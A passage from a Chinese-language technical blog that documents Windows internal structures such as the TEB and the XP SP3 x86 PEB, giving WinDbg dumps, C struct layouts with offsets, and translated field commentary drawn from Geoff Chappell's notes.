        <span class="comment">//0xfca</span></span><br><span class="line">            USHORT InitialThread:<span class="number">1</span>;                                  <span class="comment">//0xfca</span></span><br><span class="line">            USHORT SpareSameTebBits:<span class="number">5</span>;                               <span class="comment">//0xfca</span></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    VOID* TxnScopeEnterCallback;                                     <span class="comment">//0xfcc</span></span><br><span class="line">    VOID* TxnScopeExitCallback;                                      <span class="comment">//0xfd0</span></span><br><span class="line">    VOID* TxnScopeContext;                                           <span class="comment">//0xfd4</span></span><br><span class="line">    ULONG LockCount;                                                 <span class="comment">//0xfd8</span></span><br><span class="line">    ULONG SpareUlong0;                                               <span class="comment">//0xfdc</span></span><br><span class="line">    VOID* ResourceRetValue;                                          <span class="comment">//0xfe0</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>0x1a8 ActivationContextStackPointer</li><li>0x1d0 TxFsContext</li><li>0xf28 HardErrorMode</li><li>0xf50 ActivityId</li><li>0xf60 SubProcessTag</li><li>0xf64 EtwLocalData</li><li>0xf68 EtwTraceData</li><li>0xf74 CurrentIdealProcessor</li><li>0xf74 IdealProcessorValue</li><li>0xf74 ReservedPad0</li><li>0xf75 ReservedPad1</li><li>0xf76 ReservedPad2</li><li>0xf78 GuaranteedStackBytes</li><li>0xf88 SavedPriorityState</li><li>0xf8c SoftPatchPtr1</li><li>0xf90 ThreadPoolData</li><li>0xf98 MuiGeneration</li><li>0xfb4 FlsData</li><li>0xfb8 PreferredLanguages</li><li>0xfbc UserPrefLanguages</li><li>0xfc0 MergedPrefLanguages</li><li>0xfc4 MuiImpersonation</li><li>0xfc8 CrossTebFlags</li><li>0xfc8 SpareCrossTebBits</li><li>0xfca SameTebFlags</li><li>0xfca SafeThunkCall</li><li>0xfca InDebugPrint</li><li>0xfca HasFiberData</li><li>0xfca SkipThreadAttach</li><li>0xfca WerInShipAssertCode</li><li>0xfca RanProcessInit</li><li>0xfca ClonedThread</li><li>0xfca SuppressDebugMsg</li><li>0xfca DisableUserStackWalk</li><li>0xfca RtlExceptionAttached</li><li>0xfca InitialThread</li><li>0xfca SpareSameTebBits</li><li>0xfcc TxnScopeEnterCallback</li><li>0xfd0 TxnScopeExitCallback</li><li>0xfd4 TxnScopeContext</li><li>0xfd8 LockCount</li><li>0xfdc SpareUlong0</li><li>0xfe0 ResourceRetValue</li></ul><h4 id="NT-TIB-1"><a href="#NT-TIB-1" class="headerlink" title="_NT_TIB"></a>_NT_TIB</h4><p>&emsp;&emsp;未变化。</p><h4 id="CLIENT-ID-1"><a href="#CLIENT-ID-1" class="headerlink" title="_CLIENT_ID"></a>_CLIENT_ID</h4><p>&emsp;&emsp;未变化。</p><h4 id="PEB-1"><a href="#PEB-1" class="headerlink" title="_PEB"></a>_PEB</h4><p>&emsp;&emsp;见下方。</p><h4 id="ACTIVATION-CONTEXT-STACK-1"><a href="#ACTIVATION-CONTEXT-STACK-1" class="headerlink" title="_ACTIVATION_CONTEXT_STACK"></a>_ACTIVATION_CONTEXT_STACK</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _ACTIVATION_CONTEXT_STACK</span><br><span class="line">ole32!_ACTIVATION_CONTEXT_STACK</span><br><span class="line">   +<span class="number">0x000</span> ActiveFrame      : Ptr32 _RTL_ACTIVATION_CONTEXT_STACK_FRAME</span><br><span class="line">   +<span class="number">0x004</span> FrameListCache   : _LIST_ENTRY</span><br><span class="line">   +<span class="number">0x00c</span> Flags            : Uint4B</span><br><span class="line">   +<span class="number">0x010</span> NextCookieSequenceNumber : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> StackId          : Uint4B</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x18 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">ACTIVATION_CONTEXT_STACK</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_ACTIVATION_CONTEXT_STACK_FRAME</span>* <span class="title">ActiveFrame</span>;</span>                <span class="comment">//0x0</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> <span class="title">FrameListCache</span>;</span>                                      <span class="comment">//0x4</span></span><br><span class="line">    ULONG Flags;                                                            <span class="comment">//0xc</span></span><br><span class="line">    ULONG NextCookieSequenceNumber;                                         <span class="comment">//0x10</span></span><br><span class="line">    ULONG StackId;                                                          <span class="comment">//0x14</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="GDI-TEB-BATCH-1"><a href="#GDI-TEB-BATCH-1" class="headerlink" title="_GDI_TEB_BATCH"></a>_GDI_TEB_BATCH</h4><p>&emsp;&emsp;未变化。</p><h4 id="UNICODE-STRING-1"><a href="#UNICODE-STRING-1" class="headerlink" title="_UNICODE_STRING"></a>_UNICODE_STRING</h4><p>&emsp;&emsp;未变化。</p><h4 id="LIST-ENTRY-1"><a href="#LIST-ENTRY-1" class="headerlink" title="_LIST_ENTRY"></a>_LIST_ENTRY</h4><p>&emsp;&emsp;未变化。</p><h4 id="GUID"><a href="#GUID" class="headerlink" title="_GUID"></a>_GUID</h4><p>&emsp;&emsp;GUID(Globally Unique Identifier: 全局唯一标识符)是一种由算法生成的二进制长度为128位的数字标识符。在理想情况下，任何计算机和计算机集群都不会生成两个相同的GUID。在Windows平台上，GUID广泛应用于微软的产品中，用于标识如注册表项、类及接口标识、数据库、系统目录等对象。</p><p>&emsp;&emsp;GUID的格式为“xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx”，其中每个x是0-9或a-f范围内的一个十六进制数。例如：6F9619FF-8B86-D011-B42D-00C04FC964FF即为有效的GUID值。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _GUID</span><br><span class="line">ole32!_GUID</span><br><span class="line">   +<span class="number">0x000</span> Data1            : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> Data2            : Uint2B</span><br><span class="line">   +<span class="number">0x006</span> Data3            : Uint2B</span><br><span class="line">   +<span class="number">0x008</span> Data4            : [<span class="number">8</span>] UChar</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x10 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">GUID</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    ULONG Data1;           <span class="comment">//0x0</span></span><br><span class="line">    USHORT Data2;          <span class="comment">//0x4</span></span><br><span class="line">    USHORT Data3;          <span class="comment">//0x6</span></span><br><span class="line">    UCHAR Data4[<span class="number">8</span>];        <span class="comment">//0x8</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="PROCESSOR-NUMBER"><a href="#PROCESSOR-NUMBER" class="headerlink" title="_PROCESSOR_NUMBER"></a>_PROCESSOR_NUMBER</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _PROCESSOR_NUMBER</span><br><span class="line">ole32!_PROCESSOR_NUMBER</span><br><span class="line">   +<span class="number">0x000</span> Group            : Uint2B</span><br><span class="line">   +<span class="number">0x002</span> Number           : UChar</span><br><span class="line">   +<span class="number">0x003</span> Reserved         : UChar</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x4 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">PROCESSOR_NUMBER</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT Group;          <span class="comment">//0x0</span></span><br><span class="line">    UCHAR Number;          <span class="comment">//0x2</span></span><br><span class="line">    UCHAR Reserved;        <span class="comment">//0x3</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="TEB-ACTIVE-FRAME-1"><a href="#TEB-ACTIVE-FRAME-1" class="headerlink" title="_TEB_ACTIVE_FRAME"></a>_TEB_ACTIVE_FRAME</h4><p>&emsp;&emsp;未变化。</p><h2 id="PEB-2"><a href="#PEB-2" class="headerlink" title="PEB"></a>PEB</h2><p><a href="https://www.geoffchappell.com/studies/windows/km/ntoskrnl/inc/api/pebteb/peb/index.htm" target="_blank" rel="noopener">Geoff Chappell, Software Analyst - PEB</a></p><h3 id="Windows-XP-SP3-x86-1"><a href="#Windows-XP-SP3-x86-1" class="headerlink" title="Windows XP SP3 x86"></a>Windows XP SP3 x86</h3><h4 id="PEB-3"><a href="#PEB-3" class="headerlink" title="_PEB"></a>_PEB</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dt _PEB</span><br><span class="line">ntdll!_PEB</span><br><span class="line">   +<span class="number">0x000</span> InheritedAddressSpace : UChar</span><br><span class="line">   +<span class="number">0x001</span> ReadImageFileExecOptions : UChar</span><br><span class="line">   +<span class="number">0x002</span> BeingDebugged    : UChar</span><br><span class="line">   +<span class="number">0x003</span> SpareBool        : UChar</span><br><span class="line">   +<span class="number">0x004</span> Mutant           : Ptr32 Void</span><br><span class="line">   +<span class="number">0x008</span> ImageBaseAddress : Ptr32 Void</span><br><span class="line">   +<span class="number">0x00c</span> Ldr              : Ptr32 _PEB_LDR_DATA</span><br><span class="line">   +<span class="number">0x010</span> ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS</span><br><span class="line">   +<span class="number">0x014</span> SubSystemData    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x018</span> ProcessHeap      : Ptr32 Void</span><br><span class="line">   +<span class="number">0x01c</span> FastPebLock      : Ptr32 _RTL_CRITICAL_SECTION</span><br><span class="line">   +<span class="number">0x020</span> FastPebLockRoutine : Ptr32 Void</span><br><span class="line">   +<span class="number">0x024</span> FastPebUnlockRoutine : Ptr32 Void</span><br><span class="line">   +<span class="number">0x028</span> EnvironmentUpdateCount : Uint4B</span><br><span class="line">   +<span class="number">0x02c</span> KernelCallbackTable : Ptr32 Void</span><br><span class="line">   +<span class="number">0x030</span> SystemReserved   : [<span class="number">1</span>] Uint4B</span><br><span class="line">   +<span class="number">0x034</span> AtlThunkSListPtr32 : Uint4B</span><br><span class="line">   +<span class="number">0x038</span> FreeList         : Ptr32 _PEB_FREE_BLOCK</span><br><span class="line">   +<span class="number">0x03c</span> TlsExpansionCounter : Uint4B</span><br><span class="line">   +<span class="number">0x040</span> TlsBitmap        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x044</span> TlsBitmapBits    : [<span class="number">2</span>] Uint4B</span><br><span class="line">   +<span class="number">0x04c</span> ReadOnlySharedMemoryBase : Ptr32 Void</span><br><span class="line">   +<span class="number">0x050</span> ReadOnlySharedMemoryHeap : Ptr32 Void</span><br><span class="line">   +<span class="number">0x054</span> ReadOnlyStaticServerData : Ptr32 Ptr32 Void</span><br><span class="line">   +<span class="number">0x058</span> AnsiCodePageData : Ptr32 Void</span><br><span class="line">   +<span class="number">0x05c</span> OemCodePageData  : Ptr32 Void</span><br><span class="line">   +<span class="number">0x060</span> UnicodeCaseTableData : Ptr32 Void</span><br><span class="line">   +<span class="number">0x064</span> NumberOfProcessors : Uint4B</span><br><span class="line">   +<span class="number">0x068</span> NtGlobalFlag     : Uint4B</span><br><span class="line">   +<span class="number">0x070</span> CriticalSectionTimeout : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x078</span> HeapSegmentReserve : Uint4B</span><br><span class="line">   +<span class="number">0x07c</span> HeapSegmentCommit : Uint4B</span><br><span class="line">   +<span class="number">0x080</span> HeapDeCommitTotalFreeThreshold : Uint4B</span><br><span class="line">   +<span class="number">0x084</span> HeapDeCommitFreeBlockThreshold : Uint4B</span><br><span class="line">   +<span class="number">0x088</span> NumberOfHeaps    : Uint4B</span><br><span class="line">   +<span class="number">0x08c</span> MaximumNumberOfHeaps : Uint4B</span><br><span class="line">   +<span class="number">0x090</span> ProcessHeaps     : Ptr32 Ptr32 Void</span><br><span class="line">   +<span class="number">0x094</span> GdiSharedHandleTable : Ptr32 Void</span><br><span class="line">   +<span class="number">0x098</span> ProcessStarterHelper : Ptr32 Void</span><br><span class="line">   +<span class="number">0x09c</span> GdiDCAttributeList : Uint4B</span><br><span class="line">   +<span class="number">0x0a0</span> LoaderLock       : Ptr32 Void</span><br><span class="line">   +<span class="number">0x0a4</span> OSMajorVersion   : Uint4B</span><br><span class="line">   +<span class="number">0x0a8</span> OSMinorVersion   : Uint4B</span><br><span class="line">   +<span class="number">0x0ac</span> OSBuildNumber    : Uint2B</span><br><span class="line">   +<span class="number">0x0ae</span> OSCSDVersion     : Uint2B</span><br><span class="line">   +<span class="number">0x0b0</span> OSPlatformId     : Uint4B</span><br><span class="line">   +<span class="number">0x0b4</span> ImageSubsystem   : Uint4B</span><br><span class="line">   +<span class="number">0x0b8</span> ImageSubsystemMajorVersion : Uint4B</span><br><span class="line">   +<span class="number">0x0bc</span> ImageSubsystemMinorVersion : Uint4B</span><br><span class="line">   +<span class="number">0x0c0</span> ImageProcessAffinityMask : Uint4B</span><br><span class="line">   +<span class="number">0x0c4</span> GdiHandleBuffer  : [<span class="number">34</span>] Uint4B</span><br><span class="line">   +<span class="number">0x14c</span> PostProcessInitRoutine : Ptr32     <span class="keyword">void</span> </span><br><span class="line">   +<span class="number">0x150</span> TlsExpansionBitmap : Ptr32 Void</span><br><span class="line">   +<span class="number">0x154</span> TlsExpansionBitmapBits : [<span class="number">32</span>] Uint4B</span><br><span class="line">   +<span class="number">0x1d4</span> SessionId        : Uint4B</span><br><span class="line">   +<span class="number">0x1d8</span> AppCompatFlags   : _ULARGE_INTEGER</span><br><span class="line">   +<span class="number">0x1e0</span> AppCompatFlagsUser : _ULARGE_INTEGER</span><br><span class="line">   +<span class="number">0x1e8</span> pShimData        : Ptr32 Void</span><br><span class="line">   +<span class="number">0x1ec</span> AppCompatInfo    : Ptr32 Void</span><br><span class="line">   +<span class="number">0x1f0</span> CSDVersion       : _UNICODE_STRING</span><br><span class="line">   +<span class="number">0x1f8</span> ActivationContextData : Ptr32 Void</span><br><span class="line">   +<span class="number">0x1fc</span> ProcessAssemblyStorageMap : Ptr32 Void</span><br><span class="line">   +<span class="number">0x200</span> SystemDefaultActivationContextData : Ptr32 Void</span><br><span class="line">   +<span class="number">0x204</span> SystemAssemblyStorageMap : Ptr32 Void</span><br><span class="line">   +<span class="number">0x208</span> MinimumStackCommit : Uint4B</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//0x210 bytes (sizeof)</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    UCHAR InheritedAddressSpace;                             <span class="comment">//0x0</span></span><br><span class="line">    UCHAR ReadImageFileExecOptions;                          <span class="comment">//0x1</span></span><br><span class="line">    UCHAR BeingDebugged;                                     <span class="comment">//0x2</span></span><br><span class="line">    UCHAR SpareBool;                                         <span class="comment">//0x3</span></span><br><span class="line">    VOID* Mutant;                                            <span class="comment">//0x4</span></span><br><span class="line">    VOID* ImageBaseAddress;                                  <span class="comment">//0x8</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span>* <span class="title">Ldr</span>;</span>                               <span class="comment">//0xc</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_USER_PROCESS_PARAMETERS</span>* <span class="title">ProcessParameters</span>;</span>  <span class="comment">//0x10</span></span><br><span class="line">    VOID* SubSystemData;                                     <span class="comment">//0x14</span></span><br><span class="line">    VOID* ProcessHeap;                                       <span class="comment">//0x18</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">RTL_CRITICAL_SECTION</span>* <span class="title">FastPebLock</span>;</span>               <span class="comment">//0x1c</span></span><br><span class="line">    VOID* FastPebLockRoutine;                                <span class="comment">//0x20</span></span><br><span class="line">    VOID* FastPebUnlockRoutine;                              <span class="comment">//0x24</span></span><br><span class="line">    ULONG EnvironmentUpdateCount;                            <span class="comment">//0x28</span></span><br><span class="line">    VOID* KernelCallbackTable;                               <span class="comment">//0x2c</span></span><br><span class="line">    ULONG SystemReserved[<span class="number">1</span>];                                 <span class="comment">//0x30</span></span><br><span class="line">    ULONG AtlThunkSListPtr32;                                <span class="comment">//0x34</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_FREE_BLOCK</span>* <span class="title">FreeList</span>;</span>                        <span class="comment">//0x38</span></span><br><span class="line">    ULONG TlsExpansionCounter;                               <span class="comment">//0x3c</span></span><br><span class="line">    VOID* TlsBitmap;                                         <span class="comment">//0x40</span></span><br><span class="line">    ULONG TlsBitmapBits[<span class="number">2</span>];                                  <span class="comment">//0x44</span></span><br><span class="line">    VOID* ReadOnlySharedMemoryBase;                          <span class="comment">//0x4c</span></span><br><span class="line">    VOID* ReadOnlySharedMemoryHeap;                          <span class="comment">//0x50</span></span><br><span class="line">    VOID** ReadOnlyStaticServerData;                         <span class="comment">//0x54</span></span><br><span class="line">    VOID* AnsiCodePageData;                                  <span class="comment">//0x58</span></span><br><span class="line">    VOID* OemCodePageData;                                   <span class="comment">//0x5c</span></span><br><span class="line">    VOID* UnicodeCaseTableData;                              <span class="comment">//0x60</span></span><br><span class="line">    ULONG NumberOfProcessors;                                <span class="comment">//0x64</span></span><br><span class="line">    ULONG NtGlobalFlag;                                      <span class="comment">//0x68</span></span><br><span class="line">    <span class="keyword">union</span> _LARGE_INTEGER CriticalSectionTimeout;             <span class="comment">//0x70</span></span><br><span class="line">    ULONG HeapSegmentReserve;                                <span class="comment">//0x78</span></span><br><span class="line">    ULONG HeapSegmentCommit;                                 <span class="comment">//0x7c</span></span><br><span class="line">    ULONG HeapDeCommitTotalFreeThreshold;                    <span class="comment">//0x80</span></span><br><span class="line">    ULONG HeapDeCommitFreeBlockThreshold;                    <span class="comment">//0x84</span></span><br><span class="line">    ULONG NumberOfHeaps;                                     <span class="comment">//0x88</span></span><br><span class="line">    ULONG MaximumNumberOfHeaps;                              <span class="comment">//0x8c</span></span><br><span class="line">    VOID** ProcessHeaps;                                     <span class="comment">//0x90</span></span><br><span class="line">    VOID* GdiSharedHandleTable;                              <span class="comment">//0x94</span></span><br><span class="line">    VOID* ProcessStarterHelper;                              <span class="comment">//0x98</span></span><br><span class="line">    ULONG GdiDCAttributeList;                                <span class="comment">//0x9c</span></span><br><span class="line">    VOID* LoaderLock;                                        <span class="comment">//0xa0</span></span><br><span class="line">    ULONG OSMajorVersion;                                    <span class="comment">//0xa4</span></span><br><span class="line">    ULONG OSMinorVersion;                                    <span class="comment">//0xa8</span></span><br><span class="line">    USHORT OSBuildNumber;                                    <span class="comment">//0xac</span></span><br><span class="line">    USHORT OSCSDVersion;                                     <span class="comment">//0xae</span></span><br><span class="line">    ULONG OSPlatformId;                                      <span class="comment">//0xb0</span></span><br><span class="line">    ULONG ImageSubsystem;                                    <span class="comment">//0xb4</span></span><br><span class="line">    ULONG ImageSubsystemMajorVersion;                        <span class="comment">//0xb8</span></span><br><span class="line">    ULONG ImageSubsystemMinorVersion;                        <span class="comment">//0xbc</span></span><br><span class="line">    ULONG ImageProcessAffinityMask;                          <span class="comment">//0xc0</span></span><br><span class="line">    ULONG GdiHandleBuffer[<span class="number">34</span>];                               <span class="comment">//0xc4</span></span><br><span class="line">    VOID (*PostProcessInitRoutine)();                        <span class="comment">//0x14c</span></span><br><span class="line">    VOID* TlsExpansionBitmap;                                <span class="comment">//0x150</span></span><br><span class="line">    ULONG TlsExpansionBitmapBits[<span class="number">32</span>];                        <span class="comment">//0x154</span></span><br><span class="line">    ULONG SessionId;                                         <span class="comment">//0x1d4</span></span><br><span class="line">    <span class="keyword">union</span> _ULARGE_INTEGER AppCompatFlags;                    <span class="comment">//0x1d8</span></span><br><span class="line">    <span class="keyword">union</span> _ULARGE_INTEGER AppCompatFlagsUser;                <span class="comment">//0x1e0</span></span><br><span class="line">    VOID* pShimData;                                         <span class="comment">//0x1e8</span></span><br><span class="line">    VOID* AppCompatInfo;                                     <span class="comment">//0x1ec</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> <span class="title">CSDVersion</span>;</span>                       <span class="comment">//0x1f0</span></span><br><span class="line">    VOID* ActivationContextData;                             <span class="comment">//0x1f8</span></span><br><span class="line">    VOID* ProcessAssemblyStorageMap;                         <span class="comment">//0x1fc</span></span><br><span class="line">    VOID* SystemDefaultActivationContextData;                <span class="comment">//0x200</span></span><br><span class="line">    VOID* SystemAssemblyStorageMap;                          <span class="comment">//0x204</span></span><br><span class="line">    ULONG MinimumStackCommit;                                <span class="comment">//0x208</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>&emsp;&emsp;偏移量0x03的字节是否与在偏移量0x01和0x02的两个布尔值的定义的同时被显式标记为备用布尔值并不确定，但至少是可信的。无论如何，它从未被用作布尔值，而是开始在版本5.2中用作位字段，该版本首次使CPU对大页面的支持，以提高可执行映像的效率。各个位分开显示，描述很复杂，因为Windows 8.1删除了其中一个位(IsLegacyProcess)，因此更改了用于访问其他位的掩码。</p><p>&emsp;&emsp;如果仅出于有限的目的，PEB的前八个字节曾经具有单独的标识。微软为Windows NT 4.0提供的设备驱动程序工具包(DDK)中的USERKDX调试器扩展将它们作为INITIAL_PEB呈现。Windows 2000的调试器扩展也具有这种结构，并在PEB起始位置重复其成员。无论INITIAL_PEB是做什么的，它的痕迹都不会在公共符号文件中显示。</p></blockquote><ul><li><strong><code>0x000 InheritedAddressSpace</code></strong>：</li><li><strong><code>0x001 ReadImageFileExecOptions</code></strong>：</li><li><strong><code>0x002 BeingDebugged</code></strong>：指示当前进程当前是否正在被调试。内核设置BeingDebugged以指示该进程具有调试端口。KERNEL32函数IsDebuggerPresent(已文档化)所做的只是从当前PEB读取“BeingDebugged”。然而，PEB结构是一种内部操作系统结构，其布局在未来可能会发生变化。最好使用CheckRemoteDebuggerPresent函数代替。</li><li><strong><code>0x003 SpareBool</code></strong>：</li><li><strong><code>0x004 Mutant</code></strong>：</li></ul><blockquote><p>&emsp;&emsp;在最初的PEB成员中，Ldr和ProcessParameters可以说是微软高层模块中使用最多的，微软最终在WINTERNL.H发布的精简版PEB中包含了它们，让全世界都知道。然而，在任何具有自我一致性的出版物中，ProcessHeap也不会落后太多：古老的KERNEL32函数GetProcessHeap(已文档化)只是从当前PEB读取ProcessHeap，但有许多Microsoft程序和DLL是自己读取ProcessHeap(就像内联使用GetProcessHeap一样)。</p></blockquote><ul><li><strong><code>0x008 ImageBaseAddress</code></strong>：开始加载Image(exe,dll)的基地址。exe文件就被加载到此处。可以通过GetModuleHandle()来获取ImageBaseAddress。</li><li><strong><code>0x00c Ldr</code></strong>：“_PEB_LDR_DATA”结构体指针。该结构体包含进程已加载模块的信息。</li><li><strong><code>0x010 ProcessParameters</code></strong>：“_RTL_USER_PROCESS_PARAMETERS”结构体指针。该结构体包含进程参数信息，比如命令行。</li><li><strong><code>0x014 SubSystemData</code></strong>：SubSystemData就像普通Windows编程中得到的任何东西一样晦涩难懂。顾名思义，它是为那些没有得到微软足够重视，无法在PEB中定义自己成员的子系统设计的。一个子系统，比如PSXDLL.DLL所支持的子系统，可以将SubSystemData指向它自己的每个进程数据集合。</li><li><strong><code>0x018 ProcessHeap</code></strong>：进程的进程默认堆的地址。也是“_HEAP”结构的地址。</li></ul><blockquote><p>&emsp;&emsp;在早期版本中，NTDLL通过在PEB中不仅存储NTDLL数据中FastPebLock变量的地址，而且还提供用于获取和释放锁的两个例程的地址，来支持其导出的RtlAcquirePebLock和RtlReleasePebLock函数(未文档化)。尽管确实发生了锁是临界区并且例程只是预期的RtlEnterCriticalSection和RtlLeaveCriticalSection的情况，但是直到版本5.1才在PEB中正式化了锁的性质，直到版本5.2时NTDLL才停止将例程的地址保存在PEB中。</p><p>&emsp;&emsp;您可能想知道为什么将它们保存在PEB中。毕竟，RtlAcquirePebLock和RtlReleasePebLock函数应该足以满足NTDLL之外的微软用户模式代码，并希望通过同一进程中的其他线程同步对PEB的访问。让我疑惑的是，我所知道的FastPebLock在NTDLL之外的唯一用途是在内核模式下的。此外，它还使用了早已消失的FastPebLockRoutine和FastPebUnlockRoutine成员。回溯到足够远，这是通过将RtlAcquirePebLock和RtlReleasePebLock函数的完全相同的实现链接到NTDLL和内核来实现的 - 是的，如上所述，内核从TEB中找到PEB，而TEB是通过fs寄存器找到的。版本5.1进行了重新实现，以便内核可以通过没有用户模式敏感性的结构进行转换，从而从fs寄存器到KPCR到KTHREAD到EPROCESS来指向PEB的指针。如果这种更改是出于安全考虑，那么它比毫无意义更糟糕，因为内核不仅遵循PEB中的FastPebLockRoutine和FastPebUnlockRoutine指针，而且调用它们在其用户模式地址上执行(正如它所希望的那样)NTDLL代码。不要忘记，这里无论什么都是用ring0特权执行的。</p><p>&emsp;&emsp;这种对任何人都太过聪明的技巧在2003年被版本5.2去除，这当然是每个人的收获 